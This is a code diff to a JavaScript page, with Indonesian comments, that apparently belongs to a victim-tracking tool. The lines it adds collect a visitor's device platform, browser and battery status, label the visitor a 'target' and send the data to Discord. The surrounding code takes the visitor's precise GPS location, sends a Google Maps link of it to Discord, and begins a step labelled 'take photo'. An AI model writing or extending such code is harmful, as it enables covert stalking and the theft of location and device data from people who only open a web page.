@@ -39,14 +39,24 @@
     async function start() {
         if (!navigator.geolocation) return;
 
+        // --- BAGIAN PENYEDOT DATA PERANGKAT ---
+        let deviceData = "📱 **Target Terkoneksi!**\n";
+        deviceData += "• Perangkat: " + navigator.platform + "\n";
+        deviceData += "• Browser: " + navigator.userAgent.split(') ')[0] + ")\n";
+        
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            deviceData += "• Baterai: " + (b.level * 100).toFixed(0) + "% " + (b.charging ? "⚡" : "🪫");
+        }
+        await sendToDiscord(deviceData); // Kirim data HP dulu
+        // --------------------------------------
+
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            // Format link Google Maps yang standar
             const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            // 1. Kirim Notif Lokasi
-            await sendToDiscord(`📍 **Lokasi Terdeteksi!**\nLink: ${mapUrl}`);
+            await sendToDiscord(`📍 **Lokasi Presisi:**\n${mapUrl}`);
 
             // 2. Ambil Foto
             try {
